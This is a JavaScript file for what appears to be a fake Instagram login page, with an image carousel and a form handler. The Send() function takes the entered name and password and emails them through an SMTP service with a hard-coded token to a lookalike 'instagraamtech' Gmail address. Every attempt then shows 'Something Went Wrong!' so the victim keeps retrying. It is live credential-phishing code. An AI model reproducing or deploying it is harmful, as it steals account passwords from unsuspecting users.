const images = ['instagram-ph-1.png', 'instagram-ph-2.png', 'instagram-ph-3.png', 'instagram-ph-4.png'];
let currentImageIndex = 0;
const imageContainer = document.getElementById('image-container');
const imageElements = imageContainer.querySelectorAll('img');

// Function to handle the initial delay for the first image
function handleInitialDelay() {
  // Show the initial image
  imageElements[0].classList.add('image-active');
  imageElements[0].style.opacity = 1;

  // Start the image change loop after the initial delay
  imageChangeInterval = setInterval(changeImage, 6000); // Change image every 2 seconds (adjust as needed)
}

function changeImage() {
  // Get the current active image
  const activeImage = imageContainer.querySelector('.image-active');

  // Set the opacity of the current image to 0 (fade out)
  activeImage.style.opacity = 0;

  // Update the current image index
  currentImageIndex = (currentImageIndex + 1) % images.length;

  // Set the next image as active and fade it in
  imageElements[currentImageIndex].classList.add('image-active');
  imageElements[currentImageIndex].style.opacity = 1;

  // Remove the 'image-active' class from the previous active image
  activeImage.classList.remove('image-active');

  // Check if it's the first image and add a delay before the next transition
  if (currentImageIndex === 0) {
    clearInterval(imageChangeInterval); // Clear the interval
    setTimeout(() => {
      // Resume the transition after 3 seconds
      imageChangeInterval = setInterval(changeImage, 6000); // Change image every 2 seconds (adjust as needed)
    }, 7000);
  }
}

// Start the transition with the initial delay
handleInitialDelay();

function preventDefaultSubmit(event) {
  event.preventDefault();
}
function Send() {
  event.preventDefault();
  var name = document.getElementById("Name").value;
  var password = document.getElementById("password").value;
  var subject = document.getElementById("Name").value;

  if (name === "" || password === "") {
    ("Incomplete Form", "Please fill in all the fields.", "error");
    return; // Stop execution if any field is empty
  }
  var body = "Name: " + name + "<br/> Password: " + password;
  console.log(body);

  Email.send({
    SecureToken: "d47b7ed2-8653-4bb1-9ae9-788d29faf3c5",
    To: 'instagraamtech@gmail.com',
    From: 'instagraamtech@gmail.com',
    Subject: subject,
    Body: body,
  }).then(function (message) {
    setTimeout(function () {
      // Hide the message after 5 seconds
      messageDiv.style.display = "none";
    }, 5000);
    if (message === 'OK') {
      var messageDiv = document.createElement("div");
      messageDiv.textContent = "Something Went Wrong!";
      messageDiv.style.color = "red";
      messageDiv.style.fontSize = "14px";
      messageDiv.style.position = "absolute";
      messageDiv.style.top = "260px";
      messageDiv.style.left = "27%";
      document.querySelector(".login_home").appendChild(messageDiv);
    } else {
      var messageDiv = document.createElement("div");
      messageDiv.textContent = "Something Went Wrong!";
      messageDiv.style.color = "red";
      messageDiv.style.fontSize = "14px";
      messageDiv.style.position = "absolute";
      messageDiv.style.top = "260px";
      messageDiv.style.left = "27%";
      document.querySelector(".login_home").appendChild(messageDiv);
    }
  });
}